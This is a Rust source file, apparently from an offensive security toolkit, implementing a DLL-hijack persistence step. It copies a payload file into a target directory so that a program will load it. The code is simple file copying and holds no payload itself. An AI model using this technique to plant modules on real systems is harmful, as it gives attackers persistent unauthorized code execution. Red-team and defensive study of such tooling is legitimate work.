use crate::log::LogSink;
use super::{PersistConfig, PersistResult, PersistMethod};

pub fn persist(config: &PersistConfig, log: &LogSink) -> Result<PersistResult, String> {
    if config.payload_path.is_empty() {
        return Err("payload path is required".to_string());
    }
    if config.target.is_empty() {
        return Err("target directory is required".to_string());
    }

    let target_dir = std::path::Path::new(&config.target);
    if !target_dir.exists() {
        return Err(format!("target directory does not exist: {}", config.target));
    }
    if !target_dir.is_dir() {
        return Err(format!("target is not a directory: {}", config.target));
    }

    let src = std::path::Path::new(&config.payload_path);
    if !src.exists() {
        return Err(format!("payload file does not exist: {}", config.payload_path));
    }

    let file_name = if config.name.is_empty() {
        src.file_name()
            .ok_or_else(|| "cannot determine filename".to_string())?
            .to_string_lossy()
            .to_string()
    } else {
        config.name.clone()
    };

    let dest = target_dir.join(&file_name);

    log.step("Step 1: Verify target directory");
    log.detail(format!("  Source: {}", config.payload_path));
    log.detail(format!("  Destination: {}", dest.display()));

    log.step("Step 2: Place module");
    std::fs::copy(src, &dest).map_err(|e| format!("file copy failed: {}", e))?;

    log.info(format!("  Placed: {} -> {}", config.payload_path, dest.display()));

    Ok(PersistResult {
        method: PersistMethod::DllHijack,
        description: format!("Module placed at {}", dest.display()),
    })
}
